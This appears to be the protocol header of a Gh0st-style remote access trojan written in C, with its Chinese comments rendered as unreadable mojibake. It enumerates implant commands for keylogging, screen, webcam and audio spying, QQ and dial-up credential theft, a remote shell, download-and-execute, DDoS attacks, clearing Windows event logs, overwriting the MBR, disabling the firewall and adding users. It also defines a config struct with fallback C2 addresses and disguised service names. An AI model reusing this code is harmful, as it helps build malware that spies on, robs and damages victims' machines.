
#if !defined(AFX_MACROS_H_INCLUDED)
#define AFX_MACROS_H_INCLUDED

// BYTE���Ҳ��256
enum
{
	// �ļ����䷽ʽ
	TRANSFER_MODE_NORMAL = 0x00,	// һ��,������ػ���Զ���Ѿ��У�ȡ��
	TRANSFER_MODE_ADDITION,			// ׷��
	TRANSFER_MODE_ADDITION_ALL,		// ȫ��׷��
	TRANSFER_MODE_OVERWRITE,		// ����
	TRANSFER_MODE_OVERWRITE_ALL,	// ȫ������
	TRANSFER_MODE_JUMP,				// ����
	TRANSFER_MODE_JUMP_ALL,			// ȫ������
	TRANSFER_MODE_CANCEL,			// ȡ������
	
	COMMAND_CHAT,                   // Զ�̽�̸
	COMMAND_CHAT_CLOSE,             // ������̸
	COMMAND_SERMANAGER,				// ������� 
	COMMAND_SORT_PROCESS,           // ����ɸѡ
	COMMAND_SORT_WINDOW,            // ����ɸѡ
	
	COMMAND_CLIENT_CLOSE,           // ���ƶ��˳�
	
	// ���ƶ˷���������
	COMMAND_ACTIVED = 0x00,			// ����˿��Լ��ʼ����
	COMMAND_LIST_DRIVE,				// �г�����Ŀ¼
	COMMAND_LIST_FILES,				// �г�Ŀ¼�е��ļ�
	COMMAND_DOWN_FILES,				// �����ļ�
	COMMAND_FILE_SIZE,				// �ϴ�ʱ���ļ���С
	COMMAND_FILE_DATA,				// �ϴ�ʱ���ļ�����
	COMMAND_EXCEPTION,				// ���䷢���쳣����Ҫ���´���
	COMMAND_CONTINUE,				// �������������������������
	COMMAND_STOP,					// ������ֹ
	COMMAND_DELETE_FILE,			// ɾ���ļ�
	COMMAND_DELETE_DIRECTORY,		// ɾ��Ŀ¼
	COMMAND_SET_TRANSFER_MODE,		// ���ô��䷽ʽ
	COMMAND_CREATE_FOLDER,			// �����ļ���
	COMMAND_RENAME_FILE,			// �ļ����ļ�����
	COMMAND_OPEN_FILE_SHOW,			// ��ʾ���ļ�
	COMMAND_OPEN_FILE_HIDE,			// ���ش��ļ�
	
	COMMAND_SCREEN_SPY,				// ��Ļ�鿴
	COMMAND_AERO_DISABLE,			// ��������ϳ�(Aero)
	COMMAND_AERO_ENABLE,			// ��������ϳ�(Aero)
	COMMAND_SCREEN_RESET,			// �ı���Ļ���
	COMMAND_ALGORITHM_RESET,		// �ı��㷨
	COMMAND_SCREEN_CTRL_ALT_DEL,	// ����Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// ��Ļ����
	COMMAND_SCREEN_BLOCK_INPUT,		// ��������˼����������
	COMMAND_SCREEN_BLANK,			// ����˺���
	COMMAND_SCREEN_CAPTURE_LAYER,	// ��׽��
	COMMAND_SCREEN_GET_CLIPBOARD,	// ��ȡԶ�̼�����
	COMMAND_SCREEN_SET_CLIPBOARD,	// ����Զ�̼�����

	COMMAND_WEBCAM,					// ����ͷ
	COMMAND_WEBCAM_ENABLECOMPRESS,	// ����ͷ����Ҫ�󾭹�H263ѹ��
	COMMAND_WEBCAM_DISABLECOMPRESS,	// ����ͷ����Ҫ��ԭʼ����ģʽ
	COMMAND_WEBCAM_RESIZE,			// ����ͷ�����ֱ��ʣ����������INT�͵Ŀ��
	COMMAND_NEXT,					// ��һ��(���ƶ��Ѿ��򿪶Ի���)

	COMMAND_KEYBOARD,				// ���̼�¼
	COMMAND_KEYBOARD_OFFLINE,		// �������߼��̼�¼
	COMMAND_KEYBOARD_CLEAR,			// ������̼�¼����
	COMMAND_KEYBOARD_GET,			// ��ȡ���̼�¼����

	COMMAND_AUDIO,					// ��������
	COMMAND_QQINFO,					// ������Ϣ
	COMMAND_QQDATA,					// ��ȡ������Ϣ����

	COMMAND_SYSTEM,					// ϵͳ�������̣�����....��
	COMMAND_SYSTEMINFO,				// ϵͳ��Ϣ
	COMMAND_PSLIST,					// �����б�
	COMMAND_WSLIST,					// �����б�
	COMMAND_DIALUPASS,				// ��������
	COMMAND_KILLPROCESS,			// �رս���
	COMMAND_WINDOW_CLOSE,           // �رմ���
	COMMAND_WINDOW_TEST,            // ��������
	COMMAND_KILLPROCEDELE,			// �رս��̲�ɾ���ļ�
	COMMAND_SOFTWARELIST,           // ����б�
	COMMAND_IHLIST,                 // IE�����¼
	COMMAND_FULIST,                 // IE�ղؼ�
	COMMAND_NSLIST,                 // ���������б�
	COMMAND_APPUNINSTALL,           // ж�����
	COMMAND_GETHOSTS,               // ��ȡHost�ļ�
	COMMAND_SETHOSTS,               // �޸�Host�ļ�

	COMMAND_SHOW_MSG,               // ������Ϣ
	COMMAND_CHANGE_GROUP,			// ���ķ���
	
	COMMAND_SHELL,					// CmdShell
	COMMAND_SESSION,				// �Ự����ע�����������ػ���
	COMMAND_RESTART,				// ��������
	COMMAND_REMOVE,					// ж�غ���
	COMMAND_CLEAN_EVENT,			// �������� - ���ϵͳ��־
	COMMAND_CLEAN_SYSTEM,			// �������� - ���ϵͳ��־
	COMMAND_CLEAN_SECURITY,			// �������� - ���ϵͳ��־
	COMMAND_CLEAN_APPLICATION,		// �������� - ���ϵͳ��־

	COMMAND_PRANK_CONTROL,
	COMMAND_KILLMBR,				// Ӳ����
	COMMAND_GUANGQU1,				// �򿪹���
	COMMAND_GUANGQU2,				// �ջع���
	COMMAND_ZHUOMIAN1,				// ��������
	COMMAND_ZHUOMIAN2,				// ��ʾ����
	COMMAND_ZAOYIN,					// ����
	COMMAND_SHANPIN,				// ����
	COMMAND_XIANSHIQI1,				// �ر���ʾ��
	COMMAND_XIANSHIQI2,				// ����ʾ��
	COMMAND_RENWULAN1,				// ����������
	COMMAND_RENWULAN2,				// ��ʾ������
	COMMAND_MOUSE1,				    // ������һ���
	COMMAND_MOUSE2,				    // ��껥���ر�

	COMMAND_DOWN_EXEC,				// �������� - ����ִ��
	COMMAND_UPDATE_SERVER,			// �������� - ���ظ���
	COMMAND_SENDFILE_HIDE,			// ��������
	COMMAND_SENDFILE_SHOW,			// ��ʾ����
	COMMAND_SENDFILE_NRUN,			// ��ȥ����
	COMMAND_OPEN_URL_HIDE,			// �������� - ���ش���ҳ
	COMMAND_OPEN_URL_SHOW,			// �������� - ��ʾ����ҳ
	COMMAND_RENAME_REMARK,			// ��������ע
	COMMAND_REPLAY_HEARTBEAT,		// �ظ�������

	COMMAND_DDOS_START,				// DDOS����
	COMMAND_DDOS_STOP,				// ֹͣ����
	
	COMMAND_SYSINFO,                // ��������Ϣ
	COMMAND_SEND_SYSINFO,			// ��ȡ��������Ϣ
	COMMAND_SEND_INSTALLINFO,		// ��ȡ��װ��Ϣ
	COMMAND_NET_USER,				// ��net����û�
	COMMAND_GUEST,                  // ����GUEST
	COMMAND_STOPFIRE,               // �رշ���ǽ
	COMMAND_CHANGE_PORT,            // �����ն˶˿�
	COMMAND_OPEN_PROXY,				// ����
	COMMAND_CLOSE_3389,				// �ر�3389
	COMMAND_OPEN_3389,				// ����3389
	COMMAND_DLL_3389,				// ���Դ���3389dll
	COMMAND_START_MAP,				// ����ӳ��
	COMMAND_CLOSE_PORT,				// �ر�ӳ��
	COMMAND_SLIST,					// ��ȡϵͳ�û�
	COMMAND_DELUSER,				// ɾ���û�
	COMMAND_NET_CHANGE_PASS,		// �����û�����
	COMMAND_WTSLIST,				// �����û�
	COMMAND_WTS_Logoff,			    // ע���û�
	COMMAND_WTS_Disconnect,			// �Ͽ��û�
	COMMAND_DISABLEEUSER,
	COMMAND_ACITVEUSER,

	COMMAND_REGEDIT,                // ע������
	COMMAND_REG_FIND,               // ��ѯ����  
	COMMAND_REG_DELPATH,            // ɾ����
	COMMAND_REG_CREATEPATH,         // ������
	COMMAND_REG_DELKEY,             // ɾ����
	COMMAND_REG_CREATKEY,           // ������

	COMMAND_DLLVERSION,				// DLL VERSION
	COMMAND_DLLERROR,				// DLL ERROR 
	COMMAND_DLLMAIN,				// DLL MAIN
	COMMAND_DLLOK,					// ���Լ���DLL

	// ����˷����ı�ʶ
	TOKEN_AUTH = 100,				// Ҫ����֤
	TOKEN_HEARTBEAT,				// ������
	TOKEN_LOGIN,					// ���߰�
	TOKEN_DRIVE_LIST,				// �������б�
	TOKEN_FILE_LIST,				// �ļ��б�
	TOKEN_FILE_SIZE,				// �ļ���С�������ļ�ʱ��
	TOKEN_FILE_DATA,				// �ļ�����
	TOKEN_TRANSFER_FINISH,			// �������
	TOKEN_DELETE_FINISH,			// ɾ�����
	TOKEN_GET_TRANSFER_MODE,		// �õ��ļ����䷽ʽ
	TOKEN_GET_FILEDATA,				// Զ�̵õ������ļ�����
	TOKEN_CREATEFOLDER_FINISH,		// �����ļ����������
	TOKEN_DATA_CONTINUE,			// ������������
	TOKEN_RENAME_FINISH,			// �����������
	TOKEN_COMPRESS_FINISH,			// ѹ�����ѹ���
	TOKEN_EXCEPTION,				// ���������쳣

	TOKEN_CHAT_START,               // ��̸��ʼ
	TOKEN_SSLIST,					// �������
	TOKEN_INFO_YES,                 // ɸѡ�ɹ�
	TOKEN_INFO_NO,                  // ɸѡʧ��

	TOKEN_QQINFO,                   // ������Ϣ
	TOKEN_QQDATA,					// ������Ϣ����
	
	TOKEN_BITMAPINFO,				// ��Ļ�鿴��BITMAPINFO
	TOKEN_FIRSTSCREEN,				// ��Ļ�鿴�ĵ�һ��ͼ
	TOKEN_NEXTSCREEN,				// ��Ļ�鿴����һ��ͼ
	TOKEN_CLIPBOARD_TEXT,			// ��Ļ�鿴ʱ���ͼ���������   
	TOKEN_WEBCAM_BITMAPINFO,		// ����ͷ��BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// ����ͷ��ͼ������
	
	TOKEN_AUDIO_START,				// ��ʼ��������
	TOKEN_AUDIO_DATA,				// ������������

	TOKEN_KEYBOARD_START,			// ���̼�¼��ʼ
	TOKEN_KEYBOARD_DATA,			// ���̼�¼������
	
	TOKEN_SYSTEMINFO,				// ϵͳ��Ϣ
	TOKEN_PSLIST,					// �����б�
	TOKEN_WSLIST,					// �����б�
	TOKEN_DIALUPASS,				// ��������
	TOKEN_SHELL_START,				// Զ���ն˿�ʼ
	TOKEN_SOFTWARE,					// ����б�
	TOKEN_IHLIST,                   // IE�����¼
	TOKEN_FULIST,					// IE�ղؼ�
	TOKEN_NSLIST,					// ���������б�
	TOKEN_HOSTSINFO,				// Host�ļ�

	TOKEN_REGEDIT,                  // ��ע������
	TOKEN_REG_PATH,                 // ����ע�������
	TOKEN_REG_KEY,                  // ���ͼ���
	TOKEN_REG_OK,                   // ִ�гɹ�
	TOKEN_REG_NO,                   // ִ��ʧ��

	TOKEN_SYSINFOLIST,              // ��Ϣ�б�
	TOKEN_INSTALLINFOLIST,			// ��װ��Ϣ�б�
	TOKEN_ADD_SUCCESS,				// ��ӳɹ�
	TOKEN_ADD_ERROR,				// ���ʧ��
	TOKEN_DEL_SUCCESS,				// ɾ���û��ɹ�
	TOKEN_DEL_ERROR,				// ɾ���û�ʧ��
	TOKEN_CHANGE_PSAA_SUCCESS,		// �޸�����ɹ�
	TOKEN_CHANGE_PSAA_ERROR,		// �޸�����ʧ��
	TOKEN_DLL_3389,					// ����3389ʧ��
	TOKEN_SLIST,					// ö��ϵͳ�û�
	TOKEN_WTSLIST,					// ö�������û�
	TOKEN_STATE_SUCCESS,			// �����û�״̬�ɹ�
	TOKEN_STATE_ERROR,				// �����û�״̬ʧ��
	
	TOKEN_DLLVERSION,				// ��ȡDLL�İ汾
	TOKEN_DLLLOADERROR,				// �������ʧ��
	TOKEN_DLLMAIN,					// DLLMAIN
	TOKEN_DLLOK
};

typedef struct MESSAGE
{
	DWORD       msg_id;
	char		addr[255];
	int			port;
	int			time;
	int			thread;
	int			pt;
	int			updatedns;
	char		zdy[256];
	char		url[256];
	int			s;
	int			s2;
	int			onedata;
	bool		recvdata;
	char		yfcs[256];
	char		cookiescs[256];
}IMESSAGE;

typedef struct DDOS_HEAD
{
	CHAR Target[400];    //����Ŀ��
	WORD AttackPort;     //�����˿�
	WORD AttackType;     //��������
	WORD AttackThread;   //�����߳�
	WORD AttackTime;     //����ʱ��
	CHAR SendData[2000]; //���͵����ݰ�
	WORD DataSize;       //���ݰ���С
	DWORD ExtendData1;   //��������
	DWORD ExtendData2;   //��������
}ATTACK,*LPATTACK;


typedef struct 
{
	BYTE bToken;		   // = 1
	CHAR szCpuSpeend[32];  //CPU�ٶ�
	CHAR szCpuInfo[128];   //CPU��Ϣ
	CHAR szPcName[50];     //���������
	CHAR szUserName[32];   //�û���
	CHAR szActiveTime[96]; //�ʱ��
	CHAR szScrSize[32];    //��Ļ�ֱ���
	CHAR LineName[100];    //��������
	CHAR LinePort[32];     //���߶˿�
	CHAR Program[256];     //����;��
	CHAR InstallOpen[100]; //�������з�ʽ
	CHAR szUserVirus[256]; //�û�ɱ�����
	CHAR szQQNum[256];     //��ǰ���е�QQ����
	DWORD Memory;          //�ڴ�����
}MESSAGEInfo;

//������Ϣ�ṹ��
struct MODIFY_DATA
{
	TCHAR szDns1[300];      //���ߵ�ַ1
	TCHAR szDns2[300];      //���ߵ�ַ2
	DWORD dwPort1;          //���߶˿�1
	DWORD dwPort2;          //���߶˿�2
	TCHAR szGroup[50];      //���߷���
	TCHAR szVersion[32];    //���߰汾
	TCHAR SerName[100];     //��������
	TCHAR Serdisplay[128];  //��ʾ����
	TCHAR Serdesc[256];     //��������
	TCHAR szGetGroup[256];  //����Ψһ��ʶ
	BOOL  bLanPenetrate;    //�Ƿ�ʹ����������͸
	BOOL  bService;         //�Ƿ��Ƿ�������
	BOOL  bRuns;            //�Ƿ�������Ŀ¼����
	BOOL  bRunOnce;         //�Ƿ�Ϊ��ɫ��װ
	TCHAR ReleasePath[100]; //��װ;��
	TCHAR ReleaseName[50];  //��װ����
	WORD  Dele_zd;          //��װ����
	WORD  FileAttribute;    //�ļ�����
	TCHAR szDownRun[512];   //�������е�ַ
};

//��Ϣ�б�ṹ��
struct tagSystemInfo
{
	char szSystem[128];     //����ϵͳ
	char szCpuInfo[128];    //CPU��Ϣ
	char szActiveTime[128]; //�ʱ��
	char szAntiVirus[128];  //ɱ�����
	char szUserName[128];   //�û���
	char szRemotePort[128]; //Զ�̶˿�
	DWORD szMemory;         //�ڴ��С 
	DWORD szMemoryFree;     //�����ڴ� 
	DWORD szDriveSize;      //Ӳ�̴�С
	DWORD szDriveFreeSize;  //����Ӳ�̴�С
	char szOpenInfo[128];   //�Ƿ�˫��(�Ƿ���)
	char szQqNum[256];      //��ǰ���е�QQ����
};


//��װ��Ϣ�б�ṹ��
struct tagOnlineInfo
{
	char szrHostB[128]; 		//��������B
	char szrInstallTime[128]; 	//��װʱ��
	char szrSerName[128];		//��װ�ķ�����
};

typedef struct MyTcpKeepAlive   
{   
    DWORD onoff;   
    DWORD keepalivetime;   
    DWORD keepaliveinterval;   
}TCP_KEEP_ALIVE;

#define IDR_ENCODE 513		//��Դ�е�������Ϣ
#define IDR_CONFIG 514		//��Դ�еķ�����Ϣ
#define	MAX_WRITE_RETRY		15		// ����д���ļ�����
#define MAX_SEND_BUFFER		2048*50	// ��������ݳ���(�ٶȿɴﵽ50Mbps)
#define	MAX_RECV_BUFFER		2048*50 // ���������ݳ���(�ٶȿɴﵽ50Mbps)
#endif // !defined(AFX_MACROS_H_INCLUDED)
